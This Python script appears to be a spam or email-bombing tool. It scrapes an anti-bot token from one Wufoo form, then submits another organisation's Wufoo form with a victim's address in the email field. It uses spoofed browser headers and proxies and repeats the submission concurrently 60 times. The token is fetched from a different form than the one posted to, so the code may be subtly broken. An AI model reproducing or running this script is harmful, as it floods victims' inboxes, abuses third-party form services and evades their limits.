import re
from os.path import basename

import requests

import module
from module import Spam


def get(session: requests.Session):
    headers = {
        'authority': 'wonderpaws.wufoo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    response = session.get(
        'https://wonderpaws.wufoo.com/forms/we0ek1z0ax9oa8/',
        headers=headers
    )
    return response


def post(session: requests.Session, id_stamp, text, target):
    headers = {
        'authority': 'cceconferences.wufoo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarydh5vRyckcTrx1IBh',
        'origin': 'https://cceconferences.wufoo.com',
        'referer': 'https://cceconferences.wufoo.com/forms/s1rg2oqq1p1u7cw/',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    data = '------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="Field1"\r\n\r\ntest\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="Field2"\r\n\r\ntest\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="Field111"\r\n\r\nAllegany\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="Field4"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="Field5"\r\n\r\n123\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="Field5-1"\r\n\r\n123\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="Field5-2"\r\n\r\n1231\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="Field6"\r\n\r\nYes - Select yes, if you have successfully completed the training.\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="currentPage"\r\n\r\nuWVPDArwuslashrQuqECuIpnjfw2tc6TX8uF3wuBeFNR0wuBeqntMw0=\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="saveForm"\r\n\r\nSubmit\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="comment"\r\n\r\n\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="idstamp"\r\n\r\nidstamp_field\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="encryptedPassword"\r\n\r\n\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="stats"\r\n\r\n{"errors":0,"startTime":12778,"endTime":26339,"referer":null}\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh\r\nContent-Disposition: form-data; name="clickOrEnter"\r\n\r\nclick\r\n------WebKitFormBoundarydh5vRyckcTrx1IBh--\r\n'

    data = data.replace('idstamp_field', id_stamp).replace('test', text).replace('wezxasqw@gmail.com', target)

    response = session.post(
        'https://cceconferences.wufoo.com/forms/s1rg2oqq1p1u7cw/',
        headers=headers,
        data=data.encode(),
    )
    return response


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        s = requests.Session()
        s.proxies = self.get_proxies()
        get_resp = get(s)
        pattern = re.compile('(?<=name="idstamp" value=").*(?=" >)')
        idstamp = pattern.findall(get_resp.text)
        if not idstamp:
            return
        text = self.get_text()
        post_resp = post(s, idstamp[0], text, target)
        return post_resp


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'Thank you')
    res = spam.send_post(f'wezxasqw+{module.generate_text()}@gmail.com')
    if res:
        spam.run_concurrently(60)


if __name__ == '__main__':
    main()
